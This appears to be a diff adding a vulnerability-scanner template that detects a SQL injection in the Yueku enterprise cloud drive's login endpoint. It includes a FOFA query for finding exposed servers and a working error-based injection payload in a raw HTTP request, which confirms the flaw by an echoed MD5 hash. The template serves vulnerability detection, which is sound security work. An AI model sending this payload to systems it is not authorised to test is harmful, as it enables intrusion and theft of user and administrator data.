@@ -1,0 +1,37 @@
+id: yuekuwangpan-html-sql-injection
+
+info:
+  name: "悦库企业网盘 .html 接口 SQL 注入"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="悦库-悦库网盘"
+    悦库企业网盘的/user/login/.htm接口存在SQL注入漏洞。未经身份验证的远程攻击者可通过该漏洞检索数据库中的敏感信息（如管理员后台密码、用户个人信息）。在具备高权限的情况下，攻击者可能向服务器写入恶意文件，进而获取服务器系统权限。
+  reference:
+  - https://blog.csdn.net/m0_60571842/article/details/139705891
+  tags: 悦库企业网盘
+
+http:
+- raw:
+  - |
+    POST /user/login/.html HTTP/1.1
+    Host: {{Hostname}}
+    X-Requested-With: XMLHttpRequest
+    Content-Type: application/x-www-form-urlencoded
+
+    account=') AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(5597=5597,md5(123123)))),0x7e),5597)-- HZLK
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '4297f44b13955235245b2497399d7a93'
+  - type: status
+    status:
+    - 200
+
+
+
+
+
